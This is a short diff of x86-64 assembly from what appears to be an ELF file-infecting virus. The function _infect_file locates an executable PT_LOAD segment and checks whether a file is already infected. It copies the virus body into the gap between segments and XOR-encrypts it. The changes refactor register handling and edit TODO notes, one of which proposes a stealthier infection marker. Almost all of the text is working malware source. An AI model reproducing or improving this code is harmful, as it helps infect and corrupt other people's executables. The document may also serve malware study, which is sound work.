@@ -719,7 +719,6 @@ _infect_file: ; (string rdi, stat rsi)
 	jne .unmap
 
 	.is_elf_file:
-		; TODO: do 32 bits version (new compilation ?)
 		; get pt_load exec
 		mov ax, [r13 + E_PHNUM]; e_phnum
 		mov rbx, r13
@@ -727,7 +726,7 @@ _infect_file: ; (string rdi, stat rsi)
 		xor rcx, rcx
 		.find_segment_exec:
 			inc rcx
-			cmp rcx, rax ; TODO: can't be last PT_LOAD now
+			cmp rcx, rax
 			je .unmap
 			cmp dword[rbx], PT_LOAD ; p_type != PT_LOAD
 			jne .next
@@ -749,7 +748,7 @@ _infect_file: ; (string rdi, stat rsi)
 			mov rsi, [rbx + P_FILESZ]; p_filesz
 			cmp rsi, rcx
 			jl .unmap
-			call _ft_memmem
+			call _ft_memmem ; TODO: Instead modify header and add sneaky special char -> ++ speed (maybe mem ?)
 			cmp rax, 0x0
 			jne .unmap
 
@@ -769,27 +768,26 @@ _infect_file: ; (string rdi, stat rsi)
 			cmp rsi, rdx
 			jl .unmap ; if size between PT_LOAD isn't enough -> abort
 
-			sub rdx, 8 * 3
+			push rcx
+			push 8 * 3
+			pop rcx
+
+			sub rdx, rcx
 			; copy virus
-			add rdi, 8 * 3
+			add rdi, rcx
 			mov rsi, r8
 			call _ft_memcpy
 			mov rax, rdi
-			add rdx, 8 * 3
-
-			sub rax, 8 * 3
+			add rdx, rcx
+			sub rax, rcx
 
 			push rdi
-			push rcx
 			mov rdi, rax
 			push rax
-			lea rax, [rel _virus]
-			lea rcx, [rel _params]
-			sub rax, rcx
-			add rdi, rax
 			lea rcx, [rel _virus]
 			lea rsi, [rel _params]
 			sub rcx, rsi
+			add rdi, rcx
 			mov rsi, rdx; [rel length]
 			push rdx
 			sub rsi, rcx ; length - (_virus - _params)
@@ -798,8 +796,8 @@ _infect_file: ; (string rdi, stat rsi)
 			call _xor_encrypt
 			pop rdx
 			pop rax
-			pop rcx
 			pop rdi
+			pop rcx
 
 			; add _params
 			mov [rax], rdx ; length
